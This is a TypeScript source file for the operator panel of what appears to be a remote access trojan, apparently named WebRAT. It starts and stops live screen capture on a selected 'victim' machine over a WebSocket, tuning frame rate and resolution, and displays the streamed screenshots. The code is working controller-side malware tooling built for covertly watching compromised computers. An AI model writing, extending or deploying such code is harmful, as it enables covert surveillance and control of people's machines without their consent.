import type { QueryClient } from "@tanstack/react-query";

import type { Victim } from "../../../../api/victims";
import { showToast } from "../../../../toast";
import { isVictimOnline } from "../../../utils/victim-status";

type PanelWsLike = {
   state: string;
   sendJson: (payload: Record<string, unknown>) => boolean;
};

export function bindRemoteDesktopActions(p: {
   selectedVictimId: string | null;
   qc: QueryClient;
   ws: PanelWsLike;
}): (() => void) | void {
   const { selectedVictimId, qc, ws } = p;

   const loader = document.getElementById("remoteDesktopLoader");
   const screen = document.getElementById("remoteDesktopScreen");
   const stream = document.getElementById("remoteDesktopStream");
   const startBtn = document.getElementById("remoteDesktopStartBtn") as HTMLButtonElement | null;
   const panel = document.getElementById("remoteDesktopPanel");
   const fpsSlider = document.getElementById("remoteDesktopFps") as HTMLInputElement | null;
   const fpsValue = document.getElementById("remoteDesktopFpsValue");
   const resSlider = document.getElementById("remoteDesktopResolution") as HTMLInputElement | null;
   const resValue = document.getElementById("remoteDesktopResolutionValue");

   if (!loader || !screen || !startBtn || !panel || !stream) return;

   let isRunning = false;
   let isLoaded = false;
   let loadTimer: number | null = null;

   const syncSlider = (slider: HTMLInputElement | null, out: HTMLElement | null) => {
      if (!slider || !out) return;
      const fn = () => {
         try {
            out.textContent = String(slider.value || "").trim();
         } catch {
         }
      };
      slider.addEventListener("input", fn);
      slider.addEventListener("change", fn);
      fn();
      return () => {
         slider.removeEventListener("input", fn);
         slider.removeEventListener("change", fn);
      };
   };

   const unFps = syncSlider(fpsSlider, fpsValue);
   const unRes = syncSlider(resSlider, resValue);

   const connectedOk = (() => {
      if (ws.state !== "open") return false;
      const victimId = selectedVictimId;
      if (!victimId) return false;
      try {
         const data = qc.getQueryData(["victims"]);
         const list = Array.isArray(data) ? (data as Victim[]) : [];
         const v = list.find((x) => String((x as { id?: unknown }).id ?? "") === String(victimId));
         return !!(v && isVictimOnline(v));
      } catch {
         return false;
      }
   });

   const applyUi = () => {
      const connected = connectedOk();
      const showLoader = !connected || !isLoaded;

      loader.style.display = showLoader ? "block" : "none";
      screen.style.display = showLoader ? "none" : "block";
      panel.style.display = showLoader ? "none" : "block";

      startBtn.disabled = showLoader;
      startBtn.textContent = isRunning ? "Stop" : "Start";

      if (!connected) {
         isRunning = false;
         stream.style.display = "none";
         startBtn.textContent = "Start";
      }
   };

   const startLoad = () => {
      const connected = connectedOk();
      if (!connected) {
         isLoaded = false;
         applyUi();
         return;
      }
      if (isLoaded) {
         applyUi();
         return;
      }

      applyUi();
      if (loadTimer != null) {
         window.clearTimeout(loadTimer);
         loadTimer = null;
      }
      loadTimer = window.setTimeout(() => {
         isLoaded = true;
         applyUi();
      }, 700);
   };

   const onStartStop = () => {
      if (startBtn.disabled) return;
      const victimId = selectedVictimId;
      if (!victimId) {
         showToast("error", "Select victim first");
         return;
      }
      try {
         const data = qc.getQueryData(["victims"]);
         const list = Array.isArray(data) ? (data as Victim[]) : [];
         const v = list.find((x) => String((x as { id?: unknown }).id ?? "") === String(victimId));
         if (v && !isVictimOnline(v)) {
            showToast("error", "Victim offline");
            return;
         }
      } catch {
      }
      if (ws.state !== "open") {
         showToast("error", "WebSocket is not connected");
         return;
      }

      isRunning = !isRunning;

      if (isRunning) {
         const fps = fpsSlider ? parseInt(String(fpsSlider.value || "30"), 10) : 30;
         const resPct = resSlider ? parseInt(String(resSlider.value || "75"), 10) : 75;
         const ok = ws.sendJson({
            type: "rd_start",
            victim_id: String(victimId),
            fps: Number.isFinite(fps) ? fps : 30,
            resolution_percent: Number.isFinite(resPct) ? resPct : 75,
         });
         if (!ok) {
            isRunning = false;
            showToast("error", "Failed to start remote desktop");
         }
      } else {
         ws.sendJson({
            type: "rd_stop",
            victim_id: String(victimId),
         });
      }

      stream.style.display = isRunning ? "block" : "none";
      applyUi();
   };

   startBtn.addEventListener("click", onStartStop);

   const onWsMsg = (ev: CustomEvent<Record<string, unknown>>) => {
      const msg = (ev && ev.detail ? ev.detail : {}) as Record<string, unknown>;
      const t = typeof msg.type === "string" ? msg.type : "";
      if (t === "victims" || t === "update") {
         try {
            startLoad();
            applyUi();
         } catch {
         }
         return;
      }
      if (t !== "rd_frame") return;

      const victId = (() => {
         const v = msg.victim_id ?? msg.victimId ?? msg.id;
         return typeof v === "string" || typeof v === "number" ? String(v).trim() : "";
      })();
      if (!victId) return;
      if (!selectedVictimId || String(selectedVictimId) !== victId) return;
      if (!isRunning) return;

      const data = msg.data;
      if (!data || typeof data !== "string") return;

      let img: HTMLImageElement | null = null;
      try {
         img = stream.querySelector("img");
      } catch {
         img = null;
      }
      if (!img) {
         img = document.createElement("img");
         img.alt = "Remote Desktop";
         img.style.maxWidth = "100%";
         img.style.height = "auto";
         img.style.display = "block";
         img.draggable = false;
         try {
            stream.textContent = "";
         } catch {
         }
         stream.appendChild(img);
      }
      img.src = "data:image/jpeg;base64," + data;
   };

   window.addEventListener("webrat_ws_message", onWsMsg as EventListener);

   startLoad();
   applyUi();

   return () => {
      if (loadTimer != null) window.clearTimeout(loadTimer);
      startBtn.removeEventListener("click", onStartStop);
      window.removeEventListener("webrat_ws_message", onWsMsg as EventListener);
      try {
         if (unFps) unFps();
         if (unRes) unRes();
      } catch {
      }
   };
}
